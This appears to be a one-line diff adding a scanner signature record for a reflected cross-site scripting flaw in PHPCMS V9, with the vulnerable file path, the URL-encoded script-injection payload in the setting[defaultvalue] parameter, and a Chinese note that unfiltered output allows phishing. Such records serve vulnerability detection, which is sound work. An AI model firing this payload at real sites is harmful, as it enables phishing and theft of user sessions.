@@ -1,0 +1,1 @@
+50230#d9Fa0j#MED#d9Fa0j#PHPCMS V9 XSS漏洞#d9Fa0j#/phpcms/modules/content/fields/author/field_edit_form.inc.php?setting[defaultvalue]=aa%22%20%20/%3E%3Cscript%3Ealert%28window.location.href%29%3C/script%3E#d9Fa0j#GET#d9Fa0j#setting[defaultvalue]#nvs_test##d9Fa0j#PHPCMS V9对参数没有过滤，直接输出导致跨站可用作钓鱼#d9Fa0j#
